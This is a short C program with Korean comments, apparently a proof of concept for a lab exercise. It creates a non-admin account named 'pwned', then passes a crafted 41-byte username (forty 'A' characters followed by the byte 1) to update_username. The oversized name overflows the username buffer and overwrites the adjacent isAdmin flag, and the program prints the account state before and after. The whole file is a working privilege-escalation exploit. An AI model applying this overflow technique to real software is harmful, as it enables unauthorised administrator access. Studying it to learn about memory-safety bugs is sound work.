#include <stdio.h>
#include <string.h>
#include "code.h"

int main() {
    // 사용자 계정 생성 (isAdmin = false)
    int uid = create_user_account(false, "pwned");
    if (uid < 0) {
        fprintf(stderr, "Failed to create user account.\n");
        return 1;
    }

    // Before 상태 출력
    printf("Before:\n");
    printf("[*] username : %s\n", username(uid));
    printf("[*] isAdmin  : %d\n", is_admin(uid));

    // 버퍼 오버플로우 유발 (isAdmin = true로 덮기)
    char payload[50];
    memset(payload, 'A', 40);     // username 배열 꽉 채우기
    payload[40] = 1;              // isAdmin 위치 덮기 (1 = true)
    payload[41] = '\0';
    update_username(uid, payload);

    // After 상태 출력
    printf("\nAfter:\n");
    printf("[*] username : %s\n", username(uid));
    printf("[*] isAdmin  : %d\n", is_admin(uid));

    return 0;
}
